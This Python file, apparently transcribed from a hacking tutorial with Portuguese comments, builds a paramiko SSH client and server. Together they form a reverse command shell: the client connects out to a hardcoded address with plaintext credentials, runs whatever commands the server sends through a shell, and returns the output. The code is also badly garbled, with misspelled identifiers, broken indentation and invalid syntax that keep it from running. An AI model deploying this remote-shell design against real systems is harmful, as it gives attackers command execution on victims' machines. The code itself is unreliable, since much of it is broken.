#ssh com patamiko
import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHCliente()
    #client.load_host_keys('/home/justin/.ssh/know_hosts')
    client.set_missing-host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_trasnport().open_session()
    if session.active:
      ssh_session.exec_command(command)
      print ssh_session.recv(1024)
return
ssh_command('192.168.100.131', 'justin', 'lovesthepython', 'id')

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/justin/.ssh/know_hosts')
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(ip, username=user, password=passwd)
ssh_session = client.get_transport().open_session()
if ssh_session.active:
    ssh_session.send(command)
    print ssh_session.recv(1024) #le o banner
    while True:
        command = ssh_session.recv(1024) #obtem o comando do servidor ssh
        try:
            cmd_output = subprocess.check_output(command, shell=true)
            ssh_session.send(cma_output)
        except Exception, e:
            ssh_session.send(str(e))
client.close()
return
ssh_comand('192.168.100.130', 'justin', 'lovespython', 'ClientConnected')

import threading
import paramiko
import subprocess
import sys
#usando a chave dos arquivos de demonstração do paramiko
host_key = paramiko.RSAKey(filename='test_rsa.key')
class Server (paramiko.ServerInterface):
    def_init_(self):
        self.event = threading.Event()
        def check_channel_request(self, kind, chanid):
            if kind == 'session':
                return paramiko.OPEN_SUCCEEDED
            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def chech_auth_password(self, username, password):
        if (username == 'justin') and (password == 'lovespython'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
server = sys.argv[1]
ssh_port = int(sys.agv[2])
try:
    sock = socke.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET,SOCKET.SO_REUSEADOR,1)
    sock.bind((server, sssh_port))
    sock.listen(100)
    print '[+] Listenning for conncetion...'
    client, addr = sock.accept()
    except, Exception, e:
        print '[-] Listen failed: ' + strg(e)
        sys.exit(1)
        print '[+] Got a connection!'
        
        try:
            bhSession = paramiko.Transport(client)
            bhSession.addserver_keys(host_key)
            server = Server()
            try:
                bhSession.start_server(server=server)
            except paramiko.SSHException, x:
                print '[-] SSH negotiation failed.'
                chan = bhSession.accept(20)
                print '[+] Authenticated!'
                print chan.recv(1024)
                chand.send(' Welcome to bh_ssh')
                while True:
                    try:
                        command= raw_input("Enter command: ").strip('\n')
                        if command != 'exit':
                            chan.send(command)
                            print chan.recv(1024) + '\n'
                        else:
                            chand.send('exit')
                            print 'exiting'
                            bhSession.close()
                            raise Exception ('exit')
                        except KeyboardInterrupt:
                            bhSession.close()
except Exception, e:
    print '[-] Cught exception: ' + str(e)
    try:bhSession.close()
    except:
        pass
    sys.exit(1)
    